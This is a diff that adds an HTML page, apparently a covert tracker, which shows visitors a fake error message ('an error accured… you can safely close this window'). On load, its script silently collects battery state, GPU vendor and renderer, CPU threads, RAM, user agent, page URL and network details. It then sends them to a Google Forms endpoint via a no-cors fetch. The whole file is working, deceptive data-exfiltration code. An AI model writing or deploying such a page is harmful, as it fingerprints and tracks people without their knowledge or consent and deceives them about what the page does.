@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Device Info Sender</title>
+  <script>
+    async function getGPUInfo() {
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!gl) return ["unknown", "unknown"];
+
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        if (!debugInfo) return ["unknown", "unknown"];
+
+        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+        return [vendor || "unknown", renderer || "unknown"];
+      } catch {
+        return ["unknown", "unknown"];
+      }
+    }
+
+    async function sendInfo() {
+      if (!navigator.getBattery) {
+        alert("Battery API not supported on this device.");
+        return;
+      }
+
+      const b = await navigator.getBattery();
+
+      const percent = Math.round(b.level * 100);
+      const charging = b.charging ? "true" : "false";
+
+      function sec(v) {
+        if (v === Infinity || v < 0) return "infinity";
+        return Math.floor(v);
+      }
+
+      const timeFull = sec(b.chargingTime);
+      const timeEmpty = sec(b.dischargingTime);
+
+      const cpuThreads = navigator.hardwareConcurrency || "unknown";
+      const ramGB = navigator.deviceMemory || "unknown";
+      const userAgent = navigator.userAgent;
+      const pageURL = window.location.href;
+
+      const [gpuVendor, gpuRenderer] = await getGPUInfo();
+
+      const conn = navigator.connection || navigator.webkitConnection || navigator.mozConnection || {};
+      const connectionType = conn.type || "unknown";
+      const effectiveType = conn.effectiveType || "unknown";
+      const downlink = conn.downlink || "unknown";
+      const rtt = conn.rtt || "unknown";
+      const saveData = conn.saveData ? "true" : "false";
+
+      const payload = [
+        percent,
+        charging,
+        timeFull,
+        timeEmpty,
+        pageURL,
+        cpuThreads,
+        ramGB,
+        gpuVendor,
+        gpuRenderer,
+        userAgent,
+        connectionType,
+        effectiveType,
+        downlink,
+        rtt,
+        saveData
+      ].join("|");
+
+      const url =
+        "https://docs.google.com/forms/d/e/1FAIpQLSeErKfsIPrJc--YYeccfhJQkZHOTVt7mmnZSV5rlLgBcNpMTg/formResponse" +
+        "?entry.1907966889=" + encodeURIComponent(payload) +
+        "&submit=Submit";
+
+      fetch(url, { method: "GET", mode: "no-cors" })
+        
+    }
+
+  </script>
+</head>
+<body onload="sendInfo()">
+    <p>an error accured</p>
+    <p>you can safely close this window</p>
+</body>
+</html>
